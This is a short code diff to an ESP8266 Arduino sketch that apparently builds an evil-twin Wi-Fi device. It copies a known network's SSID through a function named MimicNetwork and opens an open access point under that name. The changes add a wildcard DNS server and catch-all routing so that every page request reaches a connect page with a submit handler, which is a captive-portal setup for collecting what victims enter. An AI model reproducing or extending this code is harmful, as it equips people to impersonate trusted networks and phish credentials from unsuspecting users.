@@ -11,7 +11,6 @@ uint8_t numNetworks = 0;
 String knownSSIDs[MAXSSIDS];
 
 IPAddress local_IP(192,168,4,22);
-IPAddress gateway(192,168,4,9);
 IPAddress subnet(255,255,255,0);
 
 FirebaseData FBdata;
@@ -19,6 +18,7 @@ FirebaseAuth auth;
 FirebaseConfig config;
 
 ESP8266WebServer server(DEFAULT_PORT);
+DNSServer dnsServer;
 
 String SSID;
 bool apStarted = false;
@@ -75,6 +75,7 @@ void loop(){
         }
     }
     else{
+        dnsServer.processNextRequest();
         server.handleClient();
     }
             
@@ -124,27 +125,38 @@ void MimicNetwork(){
 }
 
 void createAP(){
-    Serial.print("Creating custom network: ");
+    Serial.print("Creating network: ");
     Serial.println(SSID);
     
-    if (!WiFi.softAPConfig(local_IP, gateway, subnet)) {
-        Serial.println("Failed to configure softAP");
+    if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
+        Serial.println("Failed to configure AP");
         return;
     }
     
     //WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)
     if (!WiFi.softAP(SSID)) {
-        Serial.println("Failed to start softAP");
+        Serial.println("Failed to start AP");
         return;
     }
+
+    if(!dnsServer.start(DNS_PORT, "*", local_IP)){
+        Serial.println("Failed to start DNS Server");
+        return;
+    }
+
     delay(500);
 
     Serial.println("\nHTTP server started");
     Serial.print("IP Address: ");
     Serial.println(WiFi.softAPIP());
 
-    server.on("/", handleConnect);
-    server.on("/submit", HTTP_POST, handleSubmit);
+    server.onNotFound([]() {
+        handleConnect();
+    });
+
+    server.on("/submit", []() {
+        handleSubmit();
+    });
     //server.onNotFound(handleNotFound);
     server.begin();
     apStarted = true;
